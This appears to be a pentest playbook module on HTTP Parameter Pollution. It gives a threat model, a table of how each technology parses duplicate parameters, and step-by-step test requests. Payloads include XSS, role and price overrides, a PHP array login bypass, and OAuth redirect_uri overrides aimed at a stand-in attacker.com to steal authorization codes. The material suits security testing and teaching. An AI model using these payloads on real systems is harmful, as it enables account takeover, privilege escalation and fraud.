# VULN MODULE — HTTP Parameter Pollution (HPP)
# Asset: webapp
# CWE-235 | Report prefix: WEB-HPP

## THREAT MODEL

HTTP Parameter Pollution exploits inconsistent handling of duplicate HTTP parameters
across different components (WAF, proxy, backend). By injecting duplicate parameters,
attackers can bypass input validation, override server-side logic, or cause unexpected
behavior when the intermediary and backend disagree on which value to use.

Attack surface:
- Any parameter passed through a chain of components (WAF → proxy → app server)
- OAuth callback URLs, redirect URIs, signature parameters
- Multi-value form submissions processed by different backend components
- API gateways with parameter parsing before forwarding

## VULNERABILITY CLASSES

1. WAF bypass via duplicate params   CWE-235 — WAF reads first, backend reads last
2. OAuth / redirect_uri override     CWE-601 — duplicate redirect_uri bypasses check
3. Parameter override (logic flaw)   CWE-20  — second value overwrites business logic
4. Signature bypass                  CWE-347 — signed param, unsigned duplicate wins
5. Array injection                   CWE-235 — `param[]=val1&param[]=val2` → array

## PARSING BEHAVIOR BY TECHNOLOGY

| Technology | Duplicate param behavior | Array notation |
|---|---|---|
| PHP | Last value wins | `param[]=a&param[]=b` → array |
| ASP.NET | Comma-joined: `a,b` | `param[]=` not special |
| ASP.NET MVC | First value wins | `param[]=` → array |
| JSP (Tomcat) | First value wins | `param[]=` not special |
| Python Flask | Last value wins (`request.args['x']`) | `request.args.getlist('x')` |
| Python Django | Last value wins | `request.GET.getlist('x')` |
| Node.js (Express) | Last value wins (qs default) | `x[]=a&x[]=b` → array |
| Ruby on Rails | Last value wins | `x[]=a&x[]=b` → array |
| Go (net/http) | First value wins | `Values['x']` returns all |
| Perl (CGI.pm) | First value wins | Explicit loop needed |
| mod_wsgi (Apache) | First value wins | - |

## ATTACK PATTERNS

### Pattern 1: WAF bypass

```
# WAF reads: param=safe    → no alert
# Backend reads: param=<script>alert(1)</script>  → XSS

GET /search?q=safe&q=<script>alert(1)</script>
# Works if: WAF takes first, backend takes last
```

### Pattern 2: OAuth redirect_uri override

```
# Server validates only the first redirect_uri, but OAuth library uses the last:
GET /oauth/authorize
  ?client_id=LEGIT
  &redirect_uri=https://legit.com/callback
  &redirect_uri=https://attacker.com/steal
  &scope=email
  &response_type=code

# Or inject via encoded & in a single URI:
?redirect_uri=https://legit.com%26redirect_uri=https://attacker.com/steal
```

### Pattern 3: Server-side parameter override

```bash
# Example: add_admin_priv endpoint checks role from first param
POST /admin/action
role=user&role=admin

# If backend picks last value: role=admin → privilege escalation

# Or in URL:
GET /api/transfer?amount=1&amount=1000

# Inject into form hidden fields:
# If page has: <input type="hidden" name="price" value="10">
# Submit: price=10&price=0 → if backend takes last → free item
```

### Pattern 4: PHP array injection

```bash
# Standard value:
POST /login
username=admin&password=secret

# Array injection (PHP: password becomes array):
POST /login
username=admin&password[]=secret&password[]=anything

# If code does: if ($password == $hash) { } and $password is now an array:
# strcmp() with array → returns null → null == 0 → bypass
# md5(array) → returns null → null == "0e..." → bypass (with magic hash juggling)
```

### Pattern 5: URL-encoded & injection

```
# Single parameter value containing encoded ampersand:
GET /redirect?url=https://legit.com%26admin=true

# Server decodes → url becomes "https://legit.com&admin=true"
# If server re-parses the value as a URL → admin=true injected
```

### Pattern 6: JSON key duplication

```json
// JSON parsers may take first or last key — behavior differs:
{"action": "view", "action": "delete"}

// Python json.loads → last value: "delete"
// Java (Gson) → first value: "view"
// JavaScript JSON.parse → last value: "delete"
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Baseline
```bash
GET /api/resource?id=1
# Note: response for legitimate single param
```

### Step 2 — Duplicate param
```bash
GET /api/resource?id=1&id=2
# Does response change? Which value is used?
```

### Step 3 — Array syntax
```bash
GET /api/resource?id[]=1&id[]=2
GET /api/resource?id%5B%5D=1&id%5B%5D=2
```

### Step 4 — Injection point detection
```bash
# Inject malicious value as second duplicate, benign first:
GET /search?q=normal_text&q=<script>alert(1)</script>

# Inject malicious first, benign second (for backends that take first):
GET /search?q=<script>alert(1)</script>&q=normal_text
```

### Step 5 — OAuth / redirect_uri
```bash
# On any OAuth authorization endpoint:
GET /oauth/authorize \
  ?client_id=CLIENT \
  &redirect_uri=https://registered.com/cb \
  &redirect_uri=https://attacker.com/steal \
  &response_type=code \
  &state=STATE
```

## TOOLS

```bash
# Burp Suite — Repeater: duplicate parameters
# Param Miner (Burp extension): discovers undeclared/hidden parameters

# HPP scanner:
# https://github.com/k0st1a/hpp-scanner

# Manual: Python requests
import requests
r = requests.get("https://target.com/api",
    params=[("id", "1"), ("id", "2")])  # list of tuples = duplicate params
print(r.url, r.text)
```
